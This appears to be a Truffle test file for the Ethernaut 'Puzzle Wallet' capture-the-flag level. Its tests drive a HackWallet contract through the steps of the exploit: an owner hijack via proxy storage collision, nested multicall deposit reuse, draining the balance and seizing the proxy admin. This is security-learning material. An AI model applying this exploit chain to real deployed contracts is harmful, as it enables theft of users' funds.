const BigNumber = require("bignumber.js");

const PuzzleWalletFactory = artifacts.require("PuzzleWalletFactory");
const PuzzleWallet = artifacts.require("PuzzleWallet");
const PuzzleProxy = artifacts.require("PuzzleProxy");
const HackWallet = artifacts.require("HackWallet");

contract("puzzlefactory", (accounts) => {
    let puzzlefactory, instAdd, puzzlelogic, puzzleproxy, hack;
    beforeEach( async () => {
        puzzlefactory = await PuzzleWalletFactory.deployed();
        await puzzlefactory.createInstance(accounts[0], {value: web3.utils.toWei(String(0.001), "ether")});
        instAdd = await puzzlefactory.proxyAd.call();
        puzzleproxy = await PuzzleProxy.at(instAdd);
        puzzlelogic = await PuzzleWallet.at(instAdd);
        hack = await HackWallet.new(instAdd);
        //console.log(puzzlelogic); 
    })
    xit("test deploym", async () => {
        console.log(instAdd);
        console.log(accounts[0]);
        console.log(puzzlefactory.address);
        console.log(await puzzleproxy.admin.call());
        console.log(await puzzlelogic.owner.call());
        let bal = await puzzlelogic.maxBalance.call();
        console.log(String(bal));
        console.log(String(await web3.utils.fromWei(String(bal), "ether")));
        console.log( web3.utils.numberToHex(String(bal)));
    })

    it("hijacking logic owner by proposing new admin on proxy", async () => {
        //console.log(await puzzleproxy.pendingAdmin.call());
        await puzzleproxy.proposeNewAdmin(accounts[1], {from:accounts[1]});
        assert.equal(await puzzlelogic.owner.call(), accounts[1]);
    })

    it("hijacking logic owner with hack address", async () => {
        assert.equal(hack.address, await puzzlelogic.owner.call());
    })

    it("check if hack is whitelisted", async () => {
        assert.equal(await puzzlelogic.whitelisted(hack.address), true)
    })

    it("testing deposit call from hack contract", async () => {
        await hack.callDeposit({from: accounts[1], value: web3.utils.toWei(String(1), "ether")});
        assert.equal((String(await puzzlelogic.balances(hack.address))), web3.utils.toWei(String(1), "ether"));
    })

    it("hacking balance with multicall, expected to fail", async () => {
        await hack.callMulticall({from: accounts[1], value: web3.utils.toWei(String(1), "ether")});
        assert.equal((String(await puzzlelogic.balances(hack.address))), web3.utils.toWei(String(1), "ether"));
    })

    it("testing player balance to match instance balance after multicall", async () => {
        await hack.callMulticall({from: accounts[1], value: 1000000000000000});
        assert.equal(await puzzlelogic.balances(hack.address), await web3.eth.getBalance(instAdd));
        //console.log(await web3.eth.getBalance(instAdd));
    })

    it("testing call execute to set instance balance to 0", async () => {
        await hack.callMulticall({from: accounts[1], value: 1000000000000000});
        await hack.callExecute({from: accounts[1]});
        console.log(await web3.eth.getBalance(hack.address));
    })

    it("testing final owner hijack", async () => {
        await hack.callMulticall({from: accounts[1], value: 1000000000000000});
        await hack.callExecute({from: accounts[1]});
        await hack.callSetMaxBalance({from:accounts[1]});
        assert.equal(accounts[1], await puzzleproxy.admin.call());
    })
})